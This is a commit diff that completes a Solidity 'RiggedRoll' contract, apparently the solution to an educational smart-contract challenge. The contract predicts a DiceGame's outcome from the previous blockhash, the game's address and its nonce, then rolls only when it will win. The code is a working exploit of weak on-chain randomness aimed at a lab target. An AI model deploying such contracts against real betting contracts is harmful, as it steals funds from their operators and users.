6ec14ec960dd368b4c9d8534d802fcbda5ad484d
Sergii Vasylchenko <sergik666@gmail.com>
2022-08-14 13:09:39 +0300

    RiggedRoll contract solution

--- packages/hardhat-ts/contracts/RiggedRoll.sol
+++ packages/hardhat-ts/contracts/RiggedRoll.sol
@@ -6,19 +6,31 @@ import "./DiceGame.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 
 contract RiggedRoll is Ownable {
-
     DiceGame public diceGame;
 
     constructor(address payable diceGameAddress) {
         diceGame = DiceGame(diceGameAddress);
     }
 
-    //Add withdraw function to transfer ether from the rigged contract to an address
+    function withdraw(address _addr, uint256 _amount) public payable onlyOwner {
+        require(address(this).balance >= _amount);
+        (bool callSuccess, ) = payable(_addr).call{value: _amount}("");
+        require(callSuccess, "Call failed");
+    }
 
+    function riggedRoll() public payable {
+        require(address(this).balance >= 0.002 ether, "Failed to send enough value");
 
-    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
+        bytes32 prevHash = blockhash(block.number - 1);
+        bytes32 hash = keccak256(
+            abi.encodePacked(prevHash, address(diceGame), diceGame.nonce())
+        );
+        uint256 roll = uint256(hash) % 16;
 
+        require(roll <= 2, "Revert, incorrect roll");
 
-    //Add receive() function so contract can receive Eth
-    
+        diceGame.rollTheDice{value: 0.002 ether}();
+    }
+
+    receive() external payable {}
 }
